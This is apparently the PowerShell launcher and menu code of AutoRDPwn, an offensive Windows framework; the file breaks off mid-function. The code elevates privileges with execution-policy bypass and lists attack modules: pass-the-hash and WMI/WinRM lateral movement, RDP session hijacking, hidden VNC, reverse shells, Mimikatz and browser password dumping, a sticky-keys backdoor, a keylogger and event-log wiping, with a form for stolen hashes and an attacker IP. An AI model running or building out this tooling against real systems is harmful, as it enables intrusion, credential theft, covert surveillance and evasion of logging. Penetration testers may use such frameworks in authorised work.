
param(
    [switch]$noadmin,
    [switch]$nogui,
    [string]$lang = '',
    [string]$option = '',
    [string]$shadow = '',
    [switch]$createuser,
    [switch]$noclean
)

$ErrorActionPreference = 'Continue'
$ProgressPreference = 'SilentlyContinue'
Set-StrictMode -Off
try { [Console]::OutputEncoding = [System.Text.Encoding]::UTF8 } catch { }

$script:ARVersion = '5.2'
$script:ARIsWindows = ([Environment]::OSVersion.Platform -eq [PlatformID]::Win32NT)
$script:ARNoAdmin = [bool]$noadmin
$script:ARNoGui = [bool]$nogui
$script:ARNoClean = [bool]$noclean
$script:ARCreateUser = [bool]$createuser
$script:ARLanguageArgument = [string]$lang
$script:ARShadowPreference = ([string]$shadow).Trim().ToLowerInvariant()
$script:ARInvokedFromOption = -not [string]::IsNullOrWhiteSpace($option)
$script:AROptionValue = ([string]$option).Trim()
$script:AROriginalLocation = (Get-Location).Path

$script:ARLocal = $false
$script:ARRoot = ''
$candidates = New-Object System.Collections.Generic.List[string]
if ($PSScriptRoot) { $candidates.Add($PSScriptRoot) }
if ($MyInvocation.MyCommand.Path) { $candidates.Add((Split-Path -Parent $MyInvocation.MyCommand.Path)) }
$candidates.Add((Get-Location).Path)
foreach ($candidate in $candidates) {
    if ([string]::IsNullOrWhiteSpace($candidate)) { continue }
    if (Test-Path -LiteralPath (Join-Path $candidate 'Resources\Scripts')) {
        $script:ARRoot = $candidate
        $script:ARLocal = $true
        break
    }
}
if (-not $script:ARLocal) {
    $script:ARRoot = Join-Path $env:TEMP 'AutoRDPwn'
}
$script:ARResources = Join-Path $script:ARRoot 'Resources'
$script:ARTools = Join-Path $script:ARResources 'Tools'
foreach ($directory in @($script:ARRoot, $script:ARResources, $script:ARTools)) {
    if (-not (Test-Path -LiteralPath $directory)) {
        New-Item -ItemType Directory -Path $directory -Force | Out-Null
    }
}
$script:ARRepository = 'https://raw.githubusercontent.com/jeko1107/AutoRDPwn/master'

try {
    [System.Net.WebRequest]::DefaultWebProxy = [System.Net.WebRequest]::GetSystemWebProxy()
    [System.Net.WebRequest]::DefaultWebProxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
} catch { }
try {
    [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
} catch { }

function Test-ARHeaderAdmin {
    try {
        $identity = [Security.Principal.WindowsIdentity]::GetCurrent()
        $principal = New-Object Security.Principal.WindowsPrincipal($identity)
        return $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    } catch { return $false }
}

if ($script:ARIsWindows -and -not $script:ARNoAdmin -and -not (Test-ARHeaderAdmin)) {
    $launcher = ''
    if ($PSCommandPath) { $launcher = $PSCommandPath }
    elseif ($MyInvocation.MyCommand.Path) { $launcher = $MyInvocation.MyCommand.Path }
    if ([string]::IsNullOrWhiteSpace($launcher)) {
        Write-Host '[!] Administrator privileges are required.' -ForegroundColor Red
        exit 1
    }
    $forward = New-Object System.Collections.Generic.List[string]
    if ($script:ARNoGui) { $forward.Add('-nogui') }
    if (-not [string]::IsNullOrWhiteSpace($script:ARLanguageArgument)) { $forward.Add('-lang'); $forward.Add($script:ARLanguageArgument) }
    if (-not [string]::IsNullOrWhiteSpace($script:AROptionValue)) { $forward.Add('-option'); $forward.Add($script:AROptionValue) }
    if (-not [string]::IsNullOrWhiteSpace($script:ARShadowPreference)) { $forward.Add('-shadow'); $forward.Add($script:ARShadowPreference) }
    if ($script:ARCreateUser) { $forward.Add('-createuser') }
    if ($script:ARNoClean) { $forward.Add('-noclean') }
    $argumentList = @('-sta', '-NoProfile', '-ExecutionPolicy', 'Bypass', '-File', ('"' + $launcher + '"'))
    foreach ($argument in $forward) { $argumentList += $argument }
    Write-Host '[i] Requesting administrator privileges...' -ForegroundColor Green
    try {
        $startArgs = @{
            FilePath = 'powershell.exe'
            Verb = 'RunAs'
            ArgumentList = $argumentList
            ErrorAction = 'Stop'
        }
        if ($script:ARLocal) { $startArgs['WorkingDirectory'] = $script:ARRoot }
        Start-Process @startArgs | Out-Null
    } catch {
        Write-Host '[!] Elevation cancelled. Run this terminal as Administrator, or launch with -noadmin.' -ForegroundColor Red
        Start-Sleep -Seconds 3
        exit 1
    }
    exit
}

try {
    $Host.UI.RawUI.WindowTitle = 'AutoRDPwn - v5.2 - by @JoelGMSec'
    $Host.UI.RawUI.BackgroundColor = 'Black'
    $Host.UI.RawUI.ForegroundColor = 'Gray'
} catch { }

$script:ARLocaleName = 'English'
$script:ARStrings = @{}
$script:ARFallbackStrings = @{}
$script:ARTarget = @{
    Computer   = 'localhost'
    User       = ''
    Password   = ''
    Hash       = ''
    Domain     = ''
    AttackerIP = ''
    Mode       = 'control'
}
$script:ARStatus = @{ Text = 'Ready'; Kind = 'Info' }
$script:ARScroll = 0
$script:ARSelectedId = ''
$script:ARFilter = ''
$script:ARSessionState = 'not connected'
$script:ARTestMode = $false
$script:ARNoClear = $false
$script:ARTestWidth = 0
$script:ARTestHeight = 0
$script:ARTestBuffer = New-Object System.Collections.Generic.List[string]
$script:ARLegacyMap = @{
    '11' = '101'
    '12' = '201'
    '13' = '301'
    '14' = '401'
    '15' = '501'
    '16' = '601'
    '17' = '701'
}

function Import-ARLanguage {
    param(
        [Parameter(Mandatory = $true)][string]$Path,
        [switch]$AsFallback
    )
    if (-not (Test-Path -LiteralPath $Path)) {
        throw "Language file not found: $Path"
    }
    $captured = & {
        . $Path
        Get-Variable -Name 'txt*', 'Pwn*' -ErrorAction SilentlyContinue
    }
    $strings = @{}
    foreach ($item in $captured) {
        if ($null -ne $item -and $item.Name) {
            $strings[$item.Name] = [string]$item.Value
        }
    }
    if ($AsFallback) {
        $script:ARFallbackStrings = $strings
    }
    else {
        $script:ARStrings = $strings
    }
}

function Get-ARText {
    param(
        [Parameter(Mandatory = $true)][string]$Key,
        [string]$Default = ''
    )
    if ($script:ARStrings.ContainsKey($Key)) {
        return $script:ARStrings[$Key]
    }
    if ($script:ARFallbackStrings.ContainsKey($Key)) {
        return $script:ARFallbackStrings[$Key]
    }
    return $Default
}

function Set-ARLanguageName {
    param([Parameter(Mandatory = $true)][string]$Name)
    $script:ARLocaleName = $Name
}

function Set-ARStatus {
    param(
        [Parameter(Mandatory = $true)][string]$Text,
        [ValidateSet('Info', 'Ok', 'Warn', 'Error')][string]$Kind = 'Info'
    )
    $script:ARStatus = @{ Text = $Text; Kind = $Kind }
}

function Set-ARSessionState {
    param([string]$State)
    if ($null -eq $State -or $State -eq '') {
        $script:ARSessionState = 'not connected'
    }
    else {
        $script:ARSessionState = $State
    }
}

function Format-ARText {
    param(
        [AllowNull()][string]$Text,
        [int]$MaxWidth
    )
    if ($MaxWidth -lt 1) { return '' }
    if ($null -eq $Text) { return '' }
    $flat = ($Text -replace '[\r\n\t]+', ' ').Trim()
    if ($flat.Length -le $MaxWidth) { return $flat }
    if ($MaxWidth -le 3) { return $flat.Substring(0, $MaxWidth) }
    return $flat.Substring(0, $MaxWidth - 3) + '...'
}

function Get-ARWrappedLines {
    param(
        [AllowNull()][string]$Text,
        [int]$Width,
        [int]$MaxLines
    )
    $result = New-Object System.Collections.Generic.List[string]
    if ($Width -lt 4 -or $MaxLines -lt 1) { return @() }
    if ($null -eq $Text) { return @() }
    $flat = ($Text -replace '\s+', ' ').Trim()
    if ($flat -eq '') { return @() }
    $words = $flat -split ' '
    $line = ''
    $truncated = $false
    foreach ($word in $words) {
        if ($word.Length -gt $Width) {
            if ($line -ne '') {
                $result.Add($line)
                $line = ''
                if ($result.Count -ge $MaxLines) { $truncated = $true; break }
            }
            $result.Add($word.Substring(0, $Width))
            if ($result.Count -ge $MaxLines) { $truncated = $true; break }
            continue
        }
        if ($line -eq '') {
            $candidate = $word
        }
        else {
            $candidate = $line + ' ' + $word
        }
        if ($candidate.Length -le $Width) {
            $line = $candidate
        }
        else {
            $result.Add($line)
            if ($result.Count -ge $MaxLines) { $truncated = $true; break }
            $line = $word
        }
    }
    if ($result.Count -lt $MaxLines -and $line -ne '') {
        $result.Add($line)
    }
    elseif ($line -ne '') {
        $truncated = $true
    }
    if ($truncated -and $result.Count -gt 0) {
        $last = $result[$result.Count - 1]
        if ($last.Length -gt ($Width - 3)) {
            $last = $last.Substring(0, $Width - 3)
        }
        $result[$result.Count - 1] = $last + '...'
    }
    return $result.ToArray()
}

function Get-ARConsoleWidth {
    if ($script:ARTestMode -and $script:ARTestWidth -gt 0) { return $script:ARTestWidth }
    $width = 100
    try {
        if ([Console]::WindowWidth -gt 0) { $width = [Console]::WindowWidth }
    }
    catch { }
    if ($width -lt 60) { $width = 60 }
    return $width
}

function Get-ARConsoleHeight {
    if ($script:ARTestMode -and $script:ARTestHeight -gt 0) { return $script:ARTestHeight }
    $height = 30
    try {
        if ([Console]::WindowHeight -gt 0) { $height = [Console]::WindowHeight }
    }
    catch { }
    if ($height -lt 20) { $height = 20 }
    return $height
}

function Clear-ARScreen {
    if ($script:ARTestMode) { return }
    if ($script:ARNoClear) { return }
    Clear-Host
}

function Write-ARLine {
    param(
        [AllowEmptyString()][string]$Text = '',
        [string]$Color = 'Gray',
        [string]$Background = ''
    )
    if ($script:ARTestMode) {
        $script:ARTestBuffer.Add($Text)
        return
    }
    if ($Background -ne '') {
        Write-Host $Text -ForegroundColor $Color -BackgroundColor $Background
    }
    else {
        Write-Host $Text -ForegroundColor $Color
    }
}

function Test-ARIsAdmin {
    try {
        $identity = [Security.Principal.WindowsIdentity]::GetCurrent()
        $principal = New-Object Security.Principal.WindowsPrincipal($identity)
        return $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    }
    catch {
        return $false
    }
}

function New-ARAction {
    param(
        [Parameter(Mandatory = $true)][string]$Id,
        [Parameter(Mandatory = $true)][string]$Title,
        [Parameter(Mandatory = $true)][string]$Description,
        [Parameter(Mandatory = $true)][string]$Handler,
        [bool]$NeedsTarget = $true,
        [bool]$NeedsSession = $true
    )
    return [pscustomobject]@{
        Kind         = 'Action'
        Id           = $Id
        Title        = $Title
        Description  = $Description
        Handler      = $Handler
        NeedsTarget  = $NeedsTarget
        NeedsSession = $NeedsSession
    }
}

function New-ARGroup {
    param([Parameter(Mandatory = $true)][string]$Title)
    return [pscustomobject]@{
        Kind  = 'Group'
        Title = $Title
    }
}

function Get-ARActionCatalog {
    $items = New-Object System.Collections.Generic.List[object]

    $items.Add((New-ARAction -Id '1' -Title 'PSexec (SMB)' -Description 'Copy and start the payload with PSexec over SMB, then open the shadow session.' -Handler 'Invoke-ARAttackPSexec' -NeedsSession $false))
    $items.Add((New-ARAction -Id '2' -Title 'Pass the Hash (SMB)' -Description 'Authenticate with an NTLM hash through SMBExec and start the payload.' -Handler 'Invoke-ARAttackPassTheHash' -NeedsSession $false))
    $items.Add((New-ARAction -Id '3' -Title 'Windows Management Instrumentation (WMI)' -Description 'Create the remote process through CIM/WMI with optional credentials.' -Handler 'Invoke-ARAttackWmi' -NeedsSession $false))
    $items.Add((New-ARAction -Id '4' -Title 'Windows Remote Management (WinRM)' -Description 'Run the payload through a WinRM session with optional credentials.' -Handler 'Invoke-ARAttackWinRm' -NeedsSession $false))
    $items.Add((New-ARAction -Id '5' -Title 'Windows Remote Assistance (WinRS)' -Description 'Run the payload with WinRS and then open the shadow session.' -Handler 'Invoke-ARAttackWinRs' -NeedsSession $false))
    $items.Add((New-ARAction -Id '6' -Title 'Local Session Hijacking (TSCon)' -Description 'Attach the current console to another local session with tscon.' -Handler 'Invoke-ARAttackTscon' -NeedsTarget $false -NeedsSession $false))
    $items.Add((New-ARAction -Id '7' -Title 'Remote Desktop Execution (RDP)' -Description 'Start the payload through SharpRDP and then open the shadow session.' -Handler 'Invoke-ARAttackRdp' -NeedsSession $false))
    $items.Add((New-ARAction -Id '8' -Title (Get-ARText 'txt121' 'Quick Screen (Stealth VNC)') -Description (Get-ARText 'txt122' 'Watch or control the target screen without the user noticing') -Handler 'Invoke-ARAttackQuickScreen'))

    $items.Add((New-ARGroup -Title (Get-ARText 'txt17' 'Remote Access')))
    $items.Add((New-ARAction -Id '101' -Title 'Named Pipe Remote Shell (SMB)' -Description (Get-ARText 'txt95' 'Remote shell through a named pipe over SMB port 445') -Handler 'Invoke-ARModulePipeShell'))
    $items.Add((New-ARAction -Id '102' -Title (Get-ARText 'txt39' 'Semi-interactive console (WinRS)') -Description (Get-ARText 'txt96' 'Remote console over WinRM port 5985 using direct PowerShell') -Handler 'Invoke-ARModuleWinRsConsole'))
    $items.Add((New-ARAction -Id '103' -Title 'PowerShell HTTP-RevShell (HTTP/S)' -Description (Get-ARText 'txt97' 'Reverse shell that dials back over HTTP/S, crosses proxies') -Handler 'Invoke-ARModuleHttpRevShell'))
    $items.Add((New-ARAction -Id '104' -Title (Get-ARText 'txt51' 'Netcat console (direct connection)') -Description (Get-ARText 'txt99' 'The target listens and you connect to it') -Handler 'Invoke-ARModuleNetcatDirect'))
    $items.Add((New-ARAction -Id '105' -Title (Get-ARText 'txt52' 'Netcat console (reverse connection)') -Description (Get-ARText 'txt98' 'You listen and the target connects back to you') -Handler 'Invoke-ARModuleNetcatReverse'))

    $items.Add((New-ARGroup -Title (Get-ARText 'txt50' 'Passwords and hashes')))
    $items.Add((New-ARAction -Id '201' -Title (Get-ARText 'txt9' 'Extract local hashes with Mimikatz') -Description (Get-ARText 'txt100' 'Dump local account password hashes from the SAM registry hive') -Handler 'Invoke-ARModuleMimikatzSam'))
    $items.Add((New-ARAction -Id '202' -Title (Get-ARText 'txt10' 'Extract system passwords with Mimikatz') -Description (Get-ARText 'txt101' 'Extract plaintext passwords from the memory of authenticated processes') -Handler 'Invoke-ARModuleMimikatzLogon'))
    $items.Add((New-ARAction -Id '203' -Title (Get-ARText 'txt49' 'Obtain browsers passwords with SharpWeb') -Description (Get-ARText 'txt102' 'Recover passwords saved in Chrome, Firefox and other browsers') -Handler 'Invoke-ARModuleSharpWeb'))
    $items.Add((New-ARAction -Id '204' -Title (Get-ARText 'txt59' 'Recover Wi-Fi passwords') -Description (Get-ARText 'txt103' 'Show the keys of saved WiFi networks in clear text') -Handler 'Invoke-ARModuleWifiKeys'))

    $items.Add((New-ARGroup -Title (Get-ARText 'txt125' 'Networking / Pivoting')))
    $items.Add((New-ARAction -Id '301' -Title 'TCP Port Scan' -Description (Get-ARText 'txt104' 'Multi-threaded TCP port scan of the target') -Handler 'Invoke-ARModulePortScan' -NeedsSession $false))
    $items.Add((New-ARAction -Id '302' -Title 'Native Port Forwarding' -Description (Get-ARText 'txt105' 'Forward ports with netsh, inbound locally or remote pivoting') -Handler 'Invoke-ARModulePortForward'))
    $items.Add((New-ARAction -Id '303' -Title 'PowerShell Web Server' -Description (Get-ARText 'txt106' 'Serve files from the target with a PowerShell web server') -Handler 'Invoke-ARModuleWebServer'))
    $items.Add((New-ARAction -Id '304' -Title 'Network Creds Scanner' -Description (Get-ARText 'txt107' 'Test a password or NTLM hash against a CIDR range via SMB/WMI') -Handler 'Invoke-ARModuleCredScan' -NeedsSession $false))

    $items.Add((New-ARGroup -Title (Get-ARText 'txt126' 'Remote Desktop Forensics')))
    $items.Add((New-ARAction -Id '401' -Title (Get-ARText 'txt11' 'Rebuild the image cache') -Description (Get-ARText 'txt129' 'Recover the RDP session history cached on this computer') -Handler 'Invoke-ARModuleRdpCaching' -NeedsTarget $false -NeedsSession $false))
    $items.Add((New-ARAction -Id '402' -Title (Get-ARText 'txt127' 'List local users and groups') -Description (Get-ARText 'txt109' 'List every user with SID, groups and last logon details') -Handler 'Invoke-ARModuleListUsers'))
    $items.Add((New-ARAction -Id '403' -Title (Get-ARText 'txt128' 'Extract session credentials (SessionGopher)') -Description (Get-ARText 'txt110' 'Extract credentials stored by PuTTY, SuperPuTTY, FileZilla and WinSCP') -Handler 'Invoke-ARModuleSessionGopher'))

    $items.Add((New-ARGroup -Title (Get-ARText 'txt64' 'Backdoors and persistence')))
    $items.Add((New-ARAction -Id '501' -Title 'Sticky Keys Hacking' -Description (Get-ARText 'txt111' 'Replace sethc.exe so a SYSTEM console opens from the login screen') -Handler 'Invoke-ARModuleStickyKeys'))
    $items.Add((New-ARAction -Id '502' -Title 'Metasploit Reverse Shell' -Description (Get-ARText 'txt112' 'Deploy a persistent Metasploit reverse shell on the target') -Handler 'Invoke-ARModuleMetasploit'))
    $items.Add((New-ARAction -Id '503' -Title 'Remote Keylogger' -Description (Get-ARText 'txt113' 'Log every keystroke typed on the target console') -Handler 'Invoke-ARModuleKeylogger'))

    $items.Add((New-ARGroup -Title (Get-ARText 'txt68' 'Privilege escalation')))
    $items.Add((New-ARAction -Id '601' -Title (Get-ARText 'txt70' 'Get operating system information') -Description (Get-ARText 'txt114' 'Full enumeration of privesc surface and local misconfigurations') -Handler 'Invoke-ARModuleChachi'))
    $items.Add((New-ARAction -Id '602' -Title (Get-ARText 'txt71' 'Search vulnerabilities with Sherlock') -Description (Get-ARText 'txt115' 'Scan the system for known kernel and service vulnerabilities') -Handler 'Invoke-ARModuleSherlock'))
    $items.Add((New-ARAction -Id '603' -Title (Get-ARText 'txt130' 'Privilege escalation audit') -Description (Get-ARText 'txt116' 'Audit services, tasks, permissions and patches for escalation paths') -Handler 'Invoke-ARModulePrivescCheck'))

    $items.Add((New-ARGroup -Title (Get-ARText 'txt69' 'Other modules')))
    $items.Add((New-ARAction -Id '701' -Title (Get-ARText 'txt18' 'Deactivate system logs') -Description (Get-ARText 'txt117' 'Wipe event logs without stopping the EventLog service') -Handler 'Invoke-ARModulePhant0m'))
    $items.Add((New-ARAction -Id '702' -Title (Get-ARText 'txt62' 'Remote VNC Server (legacy)') -Description (Get-ARText 'txt118' 'Open an invisible VNC to watch and control the target screen') -Handler 'Invoke-ARModuleVncServer'))
    $items.Add((New-ARAction -Id '703' -Title (Get-ARText 'txt67' 'External script execution') -Description (Get-ARText 'txt119' 'Run any external PowerShell script or function on the target') -Handler 'Invoke-ARModuleExternalScript'))
    $items.Add((New-ARAction -Id '704' -Title (Get-ARText 'txt79' 'Change user with RunAs') -Description (Get-ARText 'txt120' 'Validate credentials and launch processes as another user') -Handler 'Invoke-ARModuleRunAs' -NeedsTarget $false -NeedsSession $false))

    return $items.ToArray()
}

function Get-ARActionById {
    param([string]$Id = '')
    if ([string]::IsNullOrWhiteSpace($Id)) { return $null }
    foreach ($item in Get-ARActionCatalog) {
        if ($item.Kind -eq 'Action' -and $item.Id -eq $Id) {
            return $item
        }
    }
    return $null
}

function Get-ARFilteredCatalog {
    param([string]$Filter = '')
    $catalog = @(Get-ARActionCatalog)
    if ($null -eq $Filter -or $Filter.Trim() -eq '') {
        return $catalog
    }
    $needle = $Filter.Trim().ToLowerInvariant()
    $result = New-Object System.Collections.Generic.List[object]
    $pendingGroup = $null
    $groupAdded = $false
    foreach ($item in $catalog) {
        if ($item.Kind -eq 'Group') {
            $pendingGroup = $item
            $groupAdded = $false
            continue
        }
        $haystack = ($item.Id + ' ' + $item.Title + ' ' + $item.Description).ToLowerInvariant()
        if ($haystack.Contains($needle)) {
            if ($pendingGroup -and -not $groupAdded) {
                $result.Add($pendingGroup)
                $groupAdded = $true
            }
            $result.Add($item)
        }
    }
    return $result.ToArray()
}

function Resolve-ARSelection {
    param([string]$Selection)
    $value = ''
    if ($null -ne $Selection) { $value = $Selection.Trim() }
    if ($value -eq '') { return '' }
    $upper = $value.ToUpperInvariant()
    if ($upper -in @('Q', 'QUIT', 'X', 'EXIT')) { return 'QUIT' }
    if ($upper -in @('L', 'LANG', 'LANGUAGE')) { return 'LANGUAGE' }
    if ($upper -in @('T', 'TARGET')) { return 'TARGET' }
    if ($value -match '^1[1-7]$') {
        $mapped = $script:ARLegacyMap[$value]
        if ($mapped) { return 'ACTION:' + $mapped }
        return ''
    }
    $action = Get-ARActionById $value
    if ($action) { return 'ACTION:' + $action.Id }
    return ''
}

function Move-ARSelection {
    param([int]$Delta)
    $rows = @(Get-ARFilteredCatalog -Filter $script:ARFilter | Where-Object { $_.Kind -eq 'Action' })
    if ($rows.Count -eq 0) { return }
    $ids = @($rows | ForEach-Object { $_.Id })
    $index = [Array]::IndexOf($ids, $script:ARSelectedId)
    if ($index -lt 0) { $index = 0 }
    else { $index = $index + $Delta }
    if ($index -lt 0) { $index = $ids.Count - 1 }
    if ($index -ge $ids.Count) { $index = 0 }
    $script:ARSelectedId = $ids[$index]
}

function Move-ARSelectionPage {
    param([int]$Pages)
    $rows = @(Get-ARFilteredCatalog -Filter $script:ARFilter | Where-Object { $_.Kind -eq 'Action' })
    if ($rows.Count -eq 0) { return }
    $ids = @($rows | ForEach-Object { $_.Id })
    $index = [Array]::IndexOf($ids, $script:ARSelectedId)
    if ($index -lt 0) { $index = 0 }
    $step = [Math]::Max(5, (Get-ARConsoleHeight) - 15)
    $index = $index + ($Pages * $step)
    if ($index -lt 0) { $index = 0 }
    if ($index -ge $ids.Count) { $index = $ids.Count - 1 }
    $script:ARSelectedId = $ids[$index]
}

function Get-ARTargetUserLabel {
    if ($script:ARTarget['User']) { return $script:ARTarget['User'] }
    return [Environment]::UserName
}

function Get-ARTargetAttackerLabel {
    if ($script:ARTarget['AttackerIP']) { return $script:ARTarget['AttackerIP'] }
    return 'auto'
}

function Show-ARTuiScreen {
    param(
        [string]$Prompt = ''
    )
    $width = Get-ARConsoleWidth
    $height = Get-ARConsoleHeight
    $inner = $width - 1
    $listHeight = [Math]::Max(5, $height - 12)
    $catalog = @(Get-ARFilteredCatalog -Filter $script:ARFilter)
    $selectedIndex = -1
    for ($i = 0; $i -lt $catalog.Count; $i++) {
        if ($catalog[$i].Kind -eq 'Action' -and $catalog[$i].Id -eq $script:ARSelectedId) {
            $selectedIndex = $i
            break
        }
    }
    if ($selectedIndex -lt 0) {
        for ($i = 0; $i -lt $catalog.Count; $i++) {
            if ($catalog[$i].Kind -eq 'Action') {
                $script:ARSelectedId = $catalog[$i].Id
                $selectedIndex = $i
                break
            }
        }
    }
    if ($selectedIndex -ge 0) {
        if ($selectedIndex -lt $script:ARScroll) { $script:ARScroll = $selectedIndex }
        if ($selectedIndex -ge ($script:ARScroll + $listHeight)) {
            $script:ARScroll = $selectedIndex - $listHeight + 1
        }
    }
    $maxScroll = [Math]::Max(0, $catalog.Count - $listHeight)
    if ($script:ARScroll -gt $maxScroll) { $script:ARScroll = $maxScroll }
    if ($script:ARScroll -lt 0) { $script:ARScroll = 0 }

    Clear-ARScreen
    $adminLabel = if (Test-ARIsAdmin) { 'yes' } else { 'no' }
    $header = 'AutoRDPwn v5.2  |  Shadow Attack Framework  |  {0}  |  admin: {1}' -f $script:ARLocaleName, $adminLabel
    Write-ARLine (Format-ARText $header $inner) 'Yellow'
    Write-ARLine ('-' * $inner) 'DarkGray'
    $targetLine = 'Target: {0}  |  User: {1}  |  Mode: {2}  |  Session: {3}' -f $script:ARTarget['Computer'], (Get-ARTargetUserLabel), $script:ARTarget['Mode'], $script:ARSessionState
    Write-ARLine (Format-ARText $targetLine $inner) 'Gray'
    Write-ARLine ('-' * $inner) 'DarkGray'

    for ($row = 0; $row -lt $listHeight; $row++) {
        $index = $script:ARScroll + $row
        if ($index -ge $catalog.Count) {
            Write-ARLine ''
            continue
        }
        $item = $catalog[$index]
        if ($item.Kind -eq 'Group') {
            Write-ARLine (Format-ARText ('  -- {0} --' -f $item.Title) $inner) 'Blue'
            continue
        }
        $selected = $item.Id -eq $script:ARSelectedId
        $marker = if ($selected) { '>' } else { ' ' }
        $text = Format-ARText (' {0} [{1,3}] {2}' -f $marker, $item.Id, $item.Title) $inner
        if ($selected) {
            Write-ARLine $text 'Black' 'Gray'
        }
        else {
            Write-ARLine $text 'Gray'
        }
    }

    Write-ARLine ('-' * $inner) 'DarkGray'
    $selectedAction = Get-ARActionById $script:ARSelectedId
    if ($selectedAction) {
        Write-ARLine (Format-ARText (' {0}  [{1}]' -f $selectedAction.Title, $selectedAction.Id) $inner) 'White'
        $descriptionLines = @(Get-ARWrappedLines -Text $selectedAction.Description -Width ($width - 3) -MaxLines 2)
        for ($i = 0; $i -lt 2; $i++) {
            if ($i -lt $descriptionLines.Count) {
                Write-ARLine (' ' + $descriptionLines[$i]) 'Gray'
            }
            else {
                Write-ARLine ''
            }
        }
    }
    else {
        Write-ARLine ' No action selected' 'DarkGray'
        Write-ARLine ''
        Write-ARLine ''
    }

    $statusColor = switch ($script:ARStatus['Kind']) {
        'Ok' { 'Green' }
        'Warn' { 'Yellow' }
        'Error' { 'Red' }
        default { 'DarkGray' }
    }
    Write-ARLine (Format-ARText (' ' + $script:ARStatus['Text']) $inner) $statusColor

    if ($Prompt -ne '') {
        Write-ARLine (Format-ARText (' ' + $Prompt) $inner) 'Yellow'
    }
    else {
        $footer = ' Up/Down move  Enter run  T target  / search  L language  F1 help  Q quit'
        if ($script:ARFilter -ne '') {
            $footer = ' Filter: ' + $script:ARFilter + '  |  Esc clear  | ' + $footer.Trim()
        }
        Write-ARLine (Format-ARText $footer $inner) 'DarkGray'
    }
}

function Show-ARHelp {
    Clear-ARScreen
    $width = Get-ARConsoleWidth
    $inner = $width - 1
    Write-ARLine (Format-ARText 'AutoRDPwn help' $inner) 'Yellow'
    Write-ARLine ('-' * $inner) 'DarkGray'
    Write-ARLine ' Up / Down        move through actions' 'Gray'
    Write-ARLine ' PgUp / PgDn      move a page at a time' 'Gray'
    Write-ARLine ' Home / End      jump to the first or last action' 'Gray'
    Write-ARLine ' Enter           run the selected action' 'Gray'
    Write-ARLine ' T               edit target, credentials and mode' 'Gray'
    Write-ARLine ' /               filter actions by text' 'Gray'
    Write-ARLine ' L               change language' 'Gray'
    Write-ARLine ' Esc             clear the filter or close a dialog' 'Gray'
    Write-ARLine ' Q / X           quit' 'Gray'
    Write-ARLine ''
    Write-ARLine ' Legacy -option values 11..17 map to the first action of each old module group.' 'DarkGray'
    Write-ARLine ''
    Write-ARLine ' Press any key to return' 'Green'
    if (-not $script:ARTestMode) {
        try { $null = [Console]::ReadKey($true) } catch { }
    }
}

function Show-ARTargetFormScreen {
    param([int]$Index)
    $width = Get-ARConsoleWidth
    $inner = $width - 1
    $fields = @(
        @{ Key = 'Computer'; Label = 'Target host' },
        @{ Key = 'User'; Label = 'User' },
        @{ Key = 'Password'; Label = 'Password' },
        @{ Key = 'Hash'; Label = 'NTLM hash' },
        @{ Key = 'Domain'; Label = 'Domain' },
        @{ Key = 'AttackerIP'; Label = 'Attacker IP' },
        @{ Key = 'Mode'; Label = 'Mode' }
    )
    Clear-ARScreen
    Write-ARLine (Format-ARText (' Target editor  |  {0}' -f $script:ARLocaleName) $inner) 'Yellow'
    Write-ARLine ('-' * $inner) 'DarkGray'
    for ($i = 0; $i -lt $fields.Count; $i++) {
        $field = $fields[$i]
        $value = [string]$script:ARTarget[$field.Key]
        if ($field.Key -eq 'Password' -and $value -ne '') { $value = '********' }
        if ($field.Key -eq 'Hash' -and $value -ne '') {
            if ($value.Length -gt 16) { $value = $value.Substring(0, 16) + '...' }
        }
        if ($field.Key -eq 'AttackerIP' -and $value -eq '') { $value = 'auto' }
        if ($field.Key -eq 'User' -and $value -eq '') { $value = '(current user)' }
        if ($value -eq '') { $value = '(not set)' }
        $marker = if ($i -eq $Index) { '>' } else { ' ' }
        $line = ' {0} {1,-12} : {2}' -f $marker, $field.Label, $value
        if ($i -eq $Index) {
            Write-ARLine (Format-ARText $line $inner) 'Black' 'Gray'
        }
        else {
            Write-ARLine (Format-ARText $line $inner) 'Gray'
        }
    }
    Write-ARLine ('-' * $inner) 'DarkGray'
    Write-ARLine ' Up/Down move  Enter edit  S save  Esc cancel' 'DarkGray'
}

function Read-ARLineValue {
    param([string]$Prompt)
    Write-Host $Prompt -NoNewline -ForegroundColor Yellow
    try { return $Host.UI.ReadLine() } catch { return $null }
}

function Read-ARSecretValue {
    param([string]$Prompt)
    Write-Host $Prompt -NoNewline -ForegroundColor Yellow
    try {
        $secure = $Host.UI.ReadLineAsSecureString()
        if ($null -eq $secure) { return '' }
        $bstr = [Runtime.InteropServices.Marshal]::SecureStringToBSTR($secure)
        try {
            return [Runtime.InteropServices.Marshal]::PtrToStringBSTR($bstr)
        }
        finally {
            [Runtime.InteropServices.Marshal]::ZeroFreeBSTR($bstr)
        }
    }
    catch { return '' }
}

function Edit-ARTargetField {
    param([hashtable]$Field)
    if ($Field.Key -eq 'Mode') {
        if ($script:ARTarget['Mode'] -eq 'control') { $script:ARTarget['Mode'] = 'view' }
        else { $script:ARTarget['Mode'] = 'control' }
        return
    }
    if ($Field.Key -eq 'Password') {
        $value = Read-ARSecretValue ' New password (Enter keeps, - clears): '
        if ($null -eq $value) { return }
        if ($value -eq '-') { $script:ARTarget['Password'] = '' }
        elseif ($value -ne '') { $script:ARTarget['Password'] = $value }
        return
    }
    $current = [string]$script:ARTarget[$Field.Key]
    $value = Read-ARLineValue (' {0} [{1}]: ' -f $Field.Label, $current)
    if ($null -eq $value) { return }
    $value = $value.Trim()
    if ($value -eq '') {
        if ($Field.Key -eq 'Computer') { $script:ARTarget['Computer'] = 'localhost' }
        elseif ($Field.Key -eq 'User') { $script:ARTarget['User'] = '' }
        else { $script:ARTarget[$Field.Key] = '' }
        return
    }
    if ($Field.Key -eq 'Mode') {
        if ($value -match '^1$|control') { $script:ARTarget['Mode'] = 'control' }
        elseif ($value -match '^2$|view') { $script:ARTarget['Mode'] = 'view' }
        return
    }
    $script:ARTarget[$Field.Key] = $value
}

function Show-ARTargetForm {
    $fields = @(
        @{ Key = 'Computer'; Label = 'Target host' },
        @{ Key = 'User'; Label = 'User' },
        @{ Key = 'Password'; Label = 'Password' },
        @{ Key = 'Hash'; Label = 'NTLM hash' },
        @{ Key = 'Domain'; Label = 'Domain' },
        @{ Key = 'AttackerIP'; Label = 'Attacker IP' },
